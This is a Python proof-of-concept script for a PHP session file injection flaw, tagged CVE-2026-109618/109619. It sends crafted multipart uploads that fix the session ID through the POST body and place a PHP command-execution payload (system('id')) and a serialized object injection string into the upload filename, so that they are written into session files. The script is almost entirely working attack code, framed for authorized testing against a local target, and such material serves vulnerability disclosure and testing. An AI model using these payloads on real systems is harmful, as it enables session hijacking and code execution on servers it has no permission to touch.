#!/usr/bin/env python3
"""
CVE-2026-109618/109619 — Verify session file injection via upload_progress filename.

Demonstrates:
  1. Session fixation via POST body PHPSESSID (bypasses use_only_cookies)
  2. Unvalidated filename stored raw in session file (can contain PHP code)
  3. Session file created with attacker-controlled content

Usage:
  python3 verify_session_injection.py --target http://127.0.0.1:18080

For authorized security testing only.
"""
import argparse
import socket
import sys
from urllib.parse import urlparse


def send_upload(host, port, path, sid, filename):
    boundary = "VERIFY"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n\r\nZ\r\n'
        f"--{boundary}--\r\n"
    ).encode("latin-1")

    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body

    s = socket.create_connection((host, port), timeout=15)
    s.sendall(req)
    s.settimeout(10)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18080")
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--sid", default="verifysession00000000000000")
    args = ap.parse_args()

    u = urlparse(args.target)
    host = u.hostname
    port = u.port or 80

    print("[*] CVE-2026-109618/109619 — Session Injection Verification")
    print(f"[*] Target: {args.target}")
    print()

    # Test 1: Normal filename
    print("[1] Testing normal filename...")
    send_upload(host, port, args.path, args.sid + "a", "normal.txt")
    print("    → Session file should contain: s:10:\"normal.txt\"")

    # Test 2: PHP code in filename
    php_payload = "<?php system('id');echo 'RCE';?>"
    print(f"[2] Testing PHP code in filename: {php_payload}")
    send_upload(host, port, args.path, args.sid + "b", php_payload)
    print(f"    → Session file should contain PHP code as raw string")

    # Test 3: Pipe character in filename (for handler mismatch)
    pipe_payload = "x|O:8:\"stdClass\":0:{}"
    print(f"[3] Testing pipe + serialized object in filename")
    # Need \" escaping for Content-Disposition
    escaped = pipe_payload.replace('"', '\\"')
    send_upload(host, port, args.path, args.sid + "c", escaped)
    print(f"    → Session file should contain |O:8: in the filename field")

    print()
    print("[*] Verification complete. Check session files on the target:")
    print(f"    cat /tmp/sessions/sess_{args.sid}a")
    print(f"    cat /tmp/sessions/sess_{args.sid}b")
    print(f"    cat /tmp/sessions/sess_{args.sid}c")
    print()
    print("[*] Key indicators:")
    print("    - Session fixation: file created with attacker-controlled SID")
    print("    - Filename injection: raw PHP code / serialized objects in session data")
    print("    - No authentication required")


if __name__ == "__main__":
    main()
